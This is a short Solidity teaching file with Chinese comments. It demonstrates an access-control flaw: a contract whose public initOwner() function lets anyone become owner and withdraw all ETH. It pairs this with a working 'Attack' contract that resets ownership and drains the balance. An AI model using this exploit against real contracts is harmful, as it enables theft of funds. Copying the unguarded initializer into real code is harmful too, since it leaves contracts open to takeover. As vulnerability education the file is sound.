// SPDX-License-Identifier: MIT
// 漏洞說明：
// 本範例示範了由於缺少正確使用 constructor 初始化 owner 導致的漏洞，取而代之的是使用一個公開的初始化函式 initOwner()。
// 此函式可被任意呼叫，任意攻擊者皆可透過呼叫該函式來重設 owner，進而取得提款權限。

pragma solidity >=0.8.0;

contract Missing {
    // 漏洞重點：並未在部署合約時正確使用 constructor 初始化 owner，而是提供了一個公開的初始化函式
    // 攻擊者可以隨時呼叫 initOwner() 以重設 owner。
    address payable private owner;

    // 本來開發者可能打算透過這個函式來初始化 owner，但卻未做任何權限檢查，導致安全性上存在漏洞
    function initOwner() public {
        owner = payable(msg.sender);
    }

    modifier onlyowner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    // 使用 receive() 正確定義接收 ETH 的函式
    receive() external payable {}

    // withdraw 函式，僅允許 owner 提現合約中的所有 ETH
    function withdraw() public onlyowner {
        owner.transfer(address(this).balance);
    }
}

// 攻擊合約：
// 攻擊流程：
// 1. 攻擊者部署 Attack 合約並傳入目標合約地址。
// 2. 攻擊者呼叫 attack() 函式，該函式先呼叫 target.initOwner() 將 owner 重設為攻擊者地址，
//    接著呼叫 withdraw() 將合約內所有 ETH 轉出。

contract Attack {
    Missing public target;

    // 將 _target 參數設為 address payable 以符合型別要求
    constructor(address payable _target) {
        target = Missing(_target);
    }

    // 攻擊步驟：
    // 透過呼叫 initOwner() 重設目標合約的 owner 為攻擊者，再呼叫 withdraw() 提取合約餘額
    function attack() external {
        target.initOwner();
        target.withdraw();
    }

    // 允許接收 ETH
    receive() external payable {}
}
